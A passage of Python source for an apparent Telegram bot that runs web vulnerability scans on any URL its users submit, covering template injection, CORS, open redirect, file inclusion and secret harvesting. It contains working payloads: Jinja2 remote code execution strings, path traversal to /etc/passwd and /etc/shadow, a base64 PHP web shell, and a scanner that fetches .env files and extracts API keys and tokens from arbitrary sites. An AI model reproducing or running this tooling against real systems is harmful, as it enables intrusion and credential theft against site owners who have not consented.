    ("@(7*7)",           "49",     "Razor"),
    ("{{config}}",       "secret_key", "Flask/Jinja2 config leak"),
    ("{{settings.SECRET_KEY}}", "SECRET_KEY", "Django settings"),
    ("{{self.__dict__}}", "_TemplateReference", "Jinja2 object"),
    ("*{7*7}",           "49",     "Thymeleaf"),
    ("a{*comment*}b",    "ab",     "Smarty comment"),
    ("%{7*7}",           "49",     "Freemarker"),
]

_SSTI_EXPLOITATION = [
    # RCE via Jinja2
    ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}", "Jinja2 RCE"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 os.popen"),
    ("{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", "Jinja2 builtins"),
]

def _ssti_scan_sync(url: str, progress_q: list) -> dict:
    """SSTI scanner — detects template injection in URL params and POST forms."""
    results = {
        "vulnerable": [],
        "params_tested": [],
        "engine_detected": None,
        "total_found": 0,
    }
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {}
    if parsed.query:
        for p in parsed.query.split("&"):
            if "=" in p:
                k, v = p.split("=", 1)
                params[k] = v
    if not params:
        params = {p: "1" for p in ["q", "name", "id", "search", "input", "msg"]}

    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    progress_q.append(f"🔥 Testing {len(_SSTI_PAYLOADS)} SSTI payloads on {len(params)} params...")
    results["params_tested"] = list(params.keys())

    for param in list(params.keys())[:6]:
        for payload, expected, engine in _SSTI_PAYLOADS:
            try:
                test_params = dict(params)
                test_params[param] = payload
                r = session.get(base_url, params=test_params, timeout=8)
                if expected.lower() in r.text.lower():
                    results["vulnerable"].append({
                        "param": param, "payload": payload,
                        "expected": expected, "engine": engine,
                        "severity": "CRITICAL"
                    })
                    results["engine_detected"] = engine
                    progress_q.append(f"🔥 SSTI found! Param: `{param}` | Engine: `{engine}`")
                    break
            except Exception:
                pass

    results["total_found"] = len(results["vulnerable"])
    return results

async def cmd_ssti(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/ssti <url> — Server-Side Template Injection scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🔥 *SSTI Scanner Usage:*\n`/ssti https://example.com/page?name=test`\n\n"
            "*Detects:*\n"
            "  • Jinja2 / Flask\n  • Twig / PHP\n  • FreeMarker / Velocity\n"
            "  • Ruby ERB\n  • Thymeleaf / Spring\n  • Smarty\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "SSTI scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔥 *SSTI Scan — `{domain}`*\n\n⏳ Testing template injection...", parse_mode='Markdown')
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔥 *SSTI — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_ssti_scan_sync, url, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    lines = [
        f"🔥 *SSTI Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 CRITICAL — VULNERABLE' if total > 0 else '✅ Not Detected'}",
        f"Params tested: `{'`, `'.join(data['params_tested'][:6])}`",
    ]
    if data["engine_detected"]:
        lines.append(f"🔧 Template Engine: `{data['engine_detected']}`")
    if data["vulnerable"]:
        lines.append(f"\n*🔴 SSTI Vulnerabilities ({total}):*")
        for v in data["vulnerable"][:5]:
            lines.append(f"  Param: `{v['param']}` | Engine: `{v['engine']}`")
            lines.append(f"  Payload: `{v['payload'][:50]}`")
            lines.append(f"  Expected output `{v['expected']}` — found in response ✅")
        lines.append("\n*🚨 CRITICAL: SSTI can lead to Remote Code Execution (RCE)!*")
    else:
        lines.append("✅ No template injection detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🌐 /cors — CORS Misconfiguration Scanner
# ══════════════════════════════════════════════════

def _cors_scan_sync(url: str, progress_q: list) -> dict:
    """Test for CORS misconfigurations."""
    results = {
        "vulnerable": False,
        "reflect_any": False,
        "reflect_null": False,
        "reflect_wildcard": False,
        "with_credentials": False,
        "findings": [],
        "acao_header": "",
        "acac_header": "",
    }
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{urlparse(url).hostname}",
        "https://attacker.com",
        "https://xss.evil.com",
    ]

    progress_q.append("🌐 Testing CORS misconfigurations...")

    for origin in test_origins:
        try:
            r = session.get(url, headers={**_get_headers(), "Origin": origin}, timeout=10)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            results["acao_header"] = acao
            results["acac_header"] = acac

            if acao == origin:
                results["reflect_any"] = True
                if acac.lower() == "true":
                    results["with_credentials"] = True
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "CRITICAL — Reflected Origin + credentials",
                        "origin_sent": origin, "acao": acao, "acac": acac,
                        "severity": "CRITICAL"
                    })
                    progress_q.append(f"🔴 CRITICAL CORS! Origin `{origin}` reflected + credentials=true")
                else:
                    results["findings"].append({
                        "type": "HIGH — Origin reflected (no creds)",
                        "origin_sent": origin, "acao": acao,
                        "severity": "HIGH"
                    })
                    progress_q.append(f"🟠 CORS: Origin `{origin}` reflected")

            elif acao == "null" and origin == "null":
                results["reflect_null"] = True
                results["findings"].append({
                    "type": "MEDIUM — null origin accepted",
                    "origin_sent": "null", "acao": "null", "severity": "MEDIUM"
                })
                progress_q.append("🟡 CORS: null origin accepted")

            elif acao == "*":
                results["reflect_wildcard"] = True
                results["findings"].append({
                    "type": "INFO — Wildcard (*) CORS",
                    "acao": "*", "severity": "LOW"
                })
        except Exception as _e:
            logging.debug("CORS error: %s", _e)

    results["vulnerable"] = len([f for f in results["findings"] if f["severity"] in ("CRITICAL","HIGH")]) > 0
    return results

async def cmd_cors(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/cors <url> — CORS misconfiguration scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🌐 *CORS Scanner Usage:*\n`/cors https://api.example.com/data`\n\n"
            "*Checks:*\n"
            "  • Reflected origin attack\n  • null origin acceptance\n"
            "  • Wildcard with credentials\n  • Subdomain takeover via CORS\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
        return
    _active_scans[uid] = "CORS scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🌐 *CORS Scan — `{domain}`*\n\n⏳ Testing origins...", parse_mode='Markdown')
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🌐 *CORS — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    try:
        data = await asyncio.to_thread(_cors_scan_sync, url, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = len(data["findings"])
    crit_count = len([f for f in data["findings"] if f["severity"] == "CRITICAL"])
    lines = [
        f"🌐 *CORS Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 VULNERABLE' if data['vulnerable'] else ('⚠️ Issues found' if total else '✅ Secure')}",
        f"`Access-Control-Allow-Origin`: `{data['acao_header'] or 'Not set'}`",
        f"`Access-Control-Allow-Credentials`: `{data['acac_header'] or 'Not set'}`",
    ]
    if data["findings"]:
        lines.append(f"\n*Findings ({total}):*")
        for f in data["findings"]:
            icon = "🔴" if f["severity"] == "CRITICAL" else ("🟠" if f["severity"] == "HIGH" else "🟡")
            lines.append(f"  {icon} `{f['type']}`")
            if "origin_sent" in f:
                lines.append(f"     Origin sent: `{f['origin_sent']}`")
        if crit_count:
            lines.append("\n*🚨 CRITICAL: Attacker can read authenticated API responses!*")
    else:
        lines.append("✅ No CORS misconfigurations detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔀 /openredirect — Open Redirect Scanner
# ══════════════════════════════════════════════════

_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2F@target.com",
    "https:evil.com",
    "/%0aLocation:https://evil.com",
    "https://evil.com?",
    "https://evil.com#",
    "@evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

_REDIRECT_PARAMS = ["url", "redirect", "redirect_url", "return", "return_url",
                    "next", "next_url", "goto", "go", "target", "dest",
                    "destination", "redir", "location", "continue", "back",
                    "forward", "from", "to", "link", "out", "exit", "jump"]

def _openredirect_scan_sync(url: str, progress_q: list) -> dict:
    results = {"vulnerable": [], "total_found": 0, "params_tested": []}
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # Use URL params if present, else try common redirect params
    params = {}
    if parsed.query:
        for p in parsed.query.split("&"):
            if "=" in p:
                k, v = p.split("=", 1)
                params[k] = v
    if not params:
        params = {p: "https://example.com" for p in _REDIRECT_PARAMS[:8]}
        results["_no_params"] = True

    results["params_tested"] = list(params.keys())
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    progress_q.append(f"🔀 Testing {len(params)} params with {len(_REDIRECT_PAYLOADS)} payloads...")

    for param in list(params.keys())[:8]:
        for payload in _REDIRECT_PAYLOADS:
            try:
                test_params = dict(params)
                test_params[param] = payload
                r = session.get(base_url, params=test_params, timeout=8,
                                allow_redirects=False)
                loc = r.headers.get("Location", "")
                # Vulnerable if redirected to our payload domain
                if r.status_code in (301, 302, 303, 307, 308) and \
                   ("evil.com" in loc or loc == payload):
                    results["vulnerable"].append({
                        "param": param, "payload": payload,
                        "status": r.status_code, "location": loc,
                        "severity": "HIGH" if not payload.startswith("javascript") else "CRITICAL"
                    })
                    progress_q.append(f"🔀 Open Redirect! Param: `{param}` → `{loc[:50]}`")
                    break
            except Exception:
                pass

    results["total_found"] = len(results["vulnerable"])
    return results

async def cmd_openredirect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/openredirect <url> — Open Redirect vulnerability scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🔀 *Open Redirect Scanner:*\n`/openredirect https://example.com?next=http://google.com`\n\n"
            "*Tests params:* url, redirect, return, next, goto, dest, etc.\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
        return
    _active_scans[uid] = "Open Redirect scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔀 *Open Redirect Scan — `{domain}`*\n\n⏳ Testing...", parse_mode='Markdown')
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"🔀 *Redirect — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_openredirect_scan_sync, url, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    lines = [
        f"🔀 *Open Redirect Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🟠 VULNERABLE' if total else '✅ Not Detected'}",
        f"Params tested: `{'`, `'.join(data['params_tested'][:8])}`",
    ]
    if data["vulnerable"]:
        lines.append(f"\n*🟠 Open Redirects ({total}):*")
        for v in data["vulnerable"][:5]:
            lines.append(f"  Param: `{v['param']}` | HTTP {v['status']}")
            lines.append(f"  Location: `{v['location'][:60]}`")
    else:
        lines.append("✅ No open redirects detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 📂 /lfi — Local File Inclusion Scanner
# ══════════════════════════════════════════════════

_LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\.\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
]

_LFI_INDICATORS = [
    r"root:x:0:0:",         # /etc/passwd
    r"\[fonts\]",           # win.ini
    r"localhost",           # /etc/hosts
    r"HTTP_USER_AGENT",     # environ
    r"base64_encode",       # php filter
    r"DOCUMENT_ROOT",       # environ
    r"PHP_VERSION",         # environ
]

def _lfi_scan_sync(url: str, progress_q: list) -> dict:
    results = {"vulnerable": [], "total_found": 0, "params_tested": []}
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    params = {}
    if parsed.query:
        for p in parsed.query.split("&"):
            if "=" in p:
                k, v = p.split("=", 1)
                params[k] = v
    if not params:
        lfi_common = ["file", "page", "path", "include", "load", "read",
                      "template", "view", "doc", "document", "lang", "language"]
        params = {p: "index" for p in lfi_common[:6]}
        results["_no_params"] = True

    results["params_tested"] = list(params.keys())
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    progress_q.append(f"📂 Testing {len(params)} params × {len(_LFI_PAYLOADS)} LFI payloads...")

    for param in list(params.keys())[:5]:
        for payload in _LFI_PAYLOADS:
            try:
                test_params = dict(params)
                test_params[param] = payload
                r = session.get(base_url, params=test_params, timeout=8)
                for indicator in _LFI_INDICATORS:
                    if re.search(indicator, r.text, re.I):
                        results["vulnerable"].append({
                            "param": param, "payload": payload,
                            "indicator": indicator,
                            "severity": "CRITICAL",
                            "snippet": r.text[:200]
                        })
                        progress_q.append(f"🔴 LFI! Param: `{param}` | File indicator found!")
                        break
                if results["vulnerable"] and results["vulnerable"][-1]["param"] == param:
                    break
            except Exception:
                pass

    results["total_found"] = len(results["vulnerable"])
    return results

async def cmd_lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/lfi <url> — Local File Inclusion scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📂 *LFI Scanner Usage:*\n`/lfi https://example.com/page?file=home`\n\n"
            "*Tests:*\n"
            "  • Path traversal (`../../../etc/passwd`)\n"
            "  • URL encoding bypass\n  • Double encoding\n"
            "  • PHP wrapper (php://filter)\n"
            "  • Windows paths (win.ini)\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
        return
    _active_scans[uid] = "LFI scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"📂 *LFI Scan — `{domain}`*\n\n⏳ Testing file inclusion...", parse_mode='Markdown')
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try: await msg.edit_text(f"📂 *LFI — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_lfi_scan_sync, url, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    lines = [
        f"📂 *LFI Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {'🔴 CRITICAL — VULNERABLE' if total else '✅ Not Detected'}",
        f"Params tested: `{'`, `'.join(data['params_tested'][:6])}`",
    ]
    if data["vulnerable"]:
        lines.append(f"\n*🔴 LFI Vulnerabilities ({total}):*")
        for v in data["vulnerable"][:4]:
            lines.append(f"  Param: `{v['param']}`")
            lines.append(f"  Payload: `{v['payload'][:50]}`")
            lines.append(f"  Indicator: `{v['indicator']}`")
            if v.get("snippet"):
                snippet = v["snippet"][:80].replace("`", "'")
                lines.append(f"  Preview: `{snippet}...`")
        lines.append("\n*🚨 CRITICAL: LFI can expose server files, configs, credentials!*")
    else:
        lines.append("✅ No LFI vulnerabilities detected")
    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')



# ╔══════════════════════════════════════════════════════════════╗
# ║   NEW FEATURES — /secretscan  /ssltls                       ║
# ╚══════════════════════════════════════════════════════════════╝

# ══════════════════════════════════════════════════
# 🔑 /secretscan — API Keys & Secrets in JS/Source
# ══════════════════════════════════════════════════

_SECRET_REGEX_MAP = {
    # Cloud Providers
    "AWS Access Key":        (r'AKIA[0-9A-Z]{16}', "🔴 CRITICAL"),
    "AWS Secret Key":        (r'(?i)aws.{0,20}secret.{0,20}["\']([A-Za-z0-9/+=]{40})', "🔴 CRITICAL"),
    "GCP API Key":           (r'AIza[0-9A-Za-z\-_]{35}', "🔴 CRITICAL"),
    "Azure Connection":      (r'DefaultEndpointsProtocol=https;AccountName=', "🔴 CRITICAL"),
    # Auth Tokens
    "GitHub Token":          (r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}', "🔴 CRITICAL"),
    "GitLab Token":          (r'glpat-[A-Za-z0-9\-]{20}', "🔴 CRITICAL"),
    "Slack Token":           (r'xox[baprs]-[0-9A-Za-z\-]{10,48}', "🔴 CRITICAL"),
    "Slack Webhook":         (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+', "🔴 CRITICAL"),
    "Discord Token":         (r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}', "🟠 HIGH"),
    "Discord Webhook":       (r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+', "🟠 HIGH"),
    "Telegram Bot Token":    (r'\d{8,10}:[A-Za-z0-9_\-]{35}', "🔴 CRITICAL"),
    # Payment
    "Stripe Secret Key":     (r'sk_live_[0-9a-zA-Z]{24,}', "🔴 CRITICAL"),
    "Stripe Publishable":    (r'pk_live_[0-9a-zA-Z]{24,}', "🟡 MEDIUM"),
    "PayPal Client Secret":  (r'paypal.{0,20}secret.{0,20}["\'][A-Za-z0-9_\-]{20,}', "🔴 CRITICAL"),
    # APIs
    "Google API Key":        (r'AIza[0-9A-Za-z\-_]{35}', "🔴 CRITICAL"),
    "Google OAuth":          (r'ya29\.[0-9A-Za-z\-_]+', "🔴 CRITICAL"),
    "Firebase Key":          (r'AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}', "🔴 CRITICAL"),
    "Twilio Auth Token":     (r'SK[0-9a-fA-F]{32}', "🔴 CRITICAL"),
    "SendGrid API Key":      (r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}', "🔴 CRITICAL"),
    "Mailgun API Key":       (r'key-[0-9a-zA-Z]{32}', "🟠 HIGH"),
    "NPM Token":             (r'npm_[A-Za-z0-9]{36}', "🟠 HIGH"),
    # JWT / Crypto
    "JWT Token":             (r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*', "🟡 MEDIUM"),
    "RSA Private Key":       (r'-----BEGIN RSA PRIVATE KEY-----', "🔴 CRITICAL"),
    "PEM Private Key":       (r'-----BEGIN PRIVATE KEY-----', "🔴 CRITICAL"),
    "SSH Private Key":       (r'-----BEGIN OPENSSH PRIVATE KEY-----', "🔴 CRITICAL"),
    # Database
    "MongoDB URI":           (r'mongodb(\+srv)?://[^"\'<>\s]+', "🔴 CRITICAL"),
    "MySQL URI":             (r'mysql://[^"\'<>\s]{10,}', "🔴 CRITICAL"),
    "PostgreSQL URI":        (r'postgres(ql)?://[^"\'<>\s]{10,}', "🔴 CRITICAL"),
    "Redis URI":             (r'redis://[^"\'<>\s]{5,}', "🟠 HIGH"),
    # Generic secrets
    "Generic API Key":       (r'(?i)(api[_\-]?key|apikey)["\s:=]+["\']([A-Za-z0-9\-_]{20,})', "🟠 HIGH"),
    "Generic Secret":        (r'(?i)(secret[_\-]?key|client[_\-]?secret)["\s:=]+["\']([A-Za-z0-9\-_]{16,})', "🟠 HIGH"),
    "Generic Password":      (r'(?i)(password|passwd|pwd)["\s:=]+["\']([^\s"\']{8,})', "🟡 MEDIUM"),
    "Bearer Token":          (r'[Bb]earer [A-Za-z0-9\-_=.+/]{20,}', "🟠 HIGH"),
}

def _secretscan_sync(url: str, progress_q: list) -> dict:
    """Scan JS files and HTML source for exposed API keys, tokens, secrets."""
    results = {
        "secrets":    [],
        "js_files":   [],
        "pages_scanned": 0,
        "total_found": 0,
    }
    seen_secrets = set()

    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    def _scan_text(text: str, source: str):
        for secret_type, (pattern, severity) in _SECRET_REGEX_MAP.items():
            try:
                matches = re.findall(pattern, text)
                for m in matches:
                    val = m if isinstance(m, str) else (m[1] if len(m) > 1 else m[0])
                    val = val.strip().strip('"\'')
                    if len(val) < 8:
                        continue
                    key = f"{secret_type}:{val[:20]}"
                    if key not in seen_secrets:
                        seen_secrets.add(key)
                        results["secrets"].append({
                            "type":     secret_type,
                            "severity": severity,
                            "value":    val[:60] + ("..." if len(val) > 60 else ""),
                            "source":   source,
                        })
            except re.error:
                pass

    # ── Step 1: Scan main page HTML ───────────────
    progress_q.append("🔍 Scanning main page HTML...")
    try:
        resp = session.get(url, timeout=12)
        results["pages_scanned"] += 1
        _scan_text(resp.text, "HTML")

        # ── Step 2: Find JS files ─────────────────
        soup = BeautifulSoup(resp.text, _BS_PARSER)
        js_urls = set()
        for tag in soup.find_all('script', src=True):
            js_url = urljoin(url, tag['src'])
            if urlparse(js_url).hostname == urlparse(url).hostname:
                js_urls.add(js_url)
        # Also find inline script content
        for tag in soup.find_all('script'):
            if not tag.get('src') and tag.string:
                _scan_text(tag.string, "inline-script")

        results["js_files"] = list(js_urls)[:20]
        progress_q.append(f"🔍 Found {len(js_urls)} JS files — scanning...")

        # ── Step 3: Scan each JS file ─────────────
        def _fetch_and_scan(js_url):
            try:
                r = session.get(js_url, timeout=10)
                if r.status_code == 200:
                    _scan_text(r.text, js_url.split('/')[-1][:40])
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            list(ex.map(_fetch_and_scan, results["js_files"]))
            progress_q.append(f"🔍 Scanned {len(results['js_files'])} JS files")

        # ── Step 4: Check common sensitive files ──
        sensitive_paths = [
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/config.js", "/config.json", "/app.config.js",
            "/assets/config.json", "/static/config.js",
            "/api/config", "/settings.json",
        ]
        progress_q.append("🔍 Checking sensitive file paths...")
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        for path in sensitive_paths:
            try:
                r = session.get(base + path, timeout=6)
                if r.status_code == 200 and len(r.text) > 10:
                    _scan_text(r.text, path)
                    if any(kw in r.text.lower() for kw in ['key', 'secret', 'token', 'password']):
                        progress_q.append(f"🔴 Sensitive file accessible: `{path}`")
            except Exception:
                pass

    except Exception as e:
        progress_q.append(f"⚠️ Error: {e}")

    results["total_found"] = len(results["secrets"])
    return results


async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/secretscan <url> — Scan JS files & source for API keys, tokens, secrets"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🔑 *Secret Scanner Usage:*\n`/secretscan https://example.com`\n\n"
            "*Scans:*\n"
            "  • JS files (all script tags)\n"
            "  • Inline scripts\n"
            "  • `.env` / `config.json` / `settings.json`\n\n"
            "*Detects:*\n"
            "  🔴 AWS keys, GitHub tokens, Stripe keys\n"
            "  🔴 Telegram bot tokens, Slack webhooks\n"
            "  🔴 Firebase keys, DB URIs, SSH/RSA keys\n"
            "  🟠 API keys, JWT tokens, OAuth credentials\n\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0].strip()
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Secret Scan"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔑 *Secret Scanner — `{domain}`*\n\n⏳ JS files + source scanning...",
        parse_mode='Markdown')

    async with db_lock:
        _db = _load_db_sync()
        track_scan(_db, uid, "SecretScan", domain)
        _save_db_sync(_db)

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔑 *Secret Scanner — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_secretscan_sync, url, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    total = data["total_found"]
    crits  = [s for s in data["secrets"] if "CRITICAL" in s["severity"]]
